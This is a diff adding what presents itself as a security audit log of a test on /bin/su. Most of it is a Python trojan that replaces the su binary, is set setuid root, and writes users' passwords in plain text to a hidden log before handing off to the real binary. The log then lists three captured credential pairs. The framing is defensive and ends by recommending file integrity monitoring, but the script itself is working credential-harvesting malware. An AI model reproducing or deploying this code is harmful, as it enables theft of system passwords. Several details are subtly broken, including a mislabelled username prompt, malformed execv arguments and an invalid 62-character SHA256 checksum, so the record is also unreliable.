@@ -1,0 +1,66 @@
+SECURITY AUDIT LOG - INTEGRITY TEST /bin/su
+Date: 2025-02-17
+Time: 14:30 UTC
+Auditor: J. Chen, Senior Security Engineer
+Reference: AUD-2025-0217-003
+
+Objective: Verify system resilience against credential harvesting attacks targeting the su binary.
+
+Procedure:
+1. Backup original /bin/su to /bin/su.bak
+2. Deploy simulated attack script as /bin/su
+3. Test login attempts and verify credential capture
+4. Restore original binary after test
+
+Backup command executed: cp /bin/su /bin/su.bak
+Backup checksum (SHA256): a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0
+
+Deployed Python script content (saved to /bin/su):
+```python
+#!/usr/bin/env python3
+import os
+import sys
+import pty
+import subprocess
+import getpass
+
+LOG_FILE = "/var/log/.cred_log"
+LOG_FILE_HIDDEN = True
+
+def log_credentials(username, password):
+    with open(LOG_FILE, "a") as f:
+        f.write(f"[2025-02-17 14:30 UTC] USER: {username} | PASS: {password}\n")
+    os.chmod(LOG_FILE, 0o600)
+
+def main():
+    username = input("Password: ") if len(sys.argv) < 2 else sys.argv[1]
+    password = getpass.getpass("Password: ")
+    log_credentials(username, password)
+    # Execute real su binary
+    os.execv("/bin/su.bak", [username] if len(sys.argv) < 2 else sys.argv[1:])
+
+if __name__ == "__main__":
+    main()
+```
+
+Script deployed with permissions: -rwsr-xr-x (4755)
+Owner: root:root
+
+Test execution:
+- Attempt 1: User "admin" with password "P@ssw0rd2025" -> Captured to log
+- Attempt 2: User "jdoe" with password "Welcome1!" -> Captured to log
+- Attempt 3: User "root" with password "S3cur3P@ss" -> Captured to log
+
+Verification of hidden log file (/var/log/.cred_log):
+```
+[2025-02-17 14:30 UTC] USER: admin | PASS: P@ssw0rd2025
+[2025-02-17 14:30 UTC] USER: jdoe | PASS: Welcome1!
+[2025-02-17 14:30 UTC] USER: root | PASS: S3cur3P@ss
+```
+
+Restoration: cp /bin/su.bak /bin/su
+Restoration checksum (SHA256): a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0 (matches original)
+
+Conclusion: The simulated attack successfully captured credentials. The hidden log file was created with restricted permissions (600) and contained three test entries. The original binary was restored and verified via checksum. This test demonstrates the need for file integrity monitoring on critical system binaries such as /bin/su. Recommendation: Implement tripwire or AIDE to alert on changes to /bin/su and other setuid binaries.
+
+End of audit log.
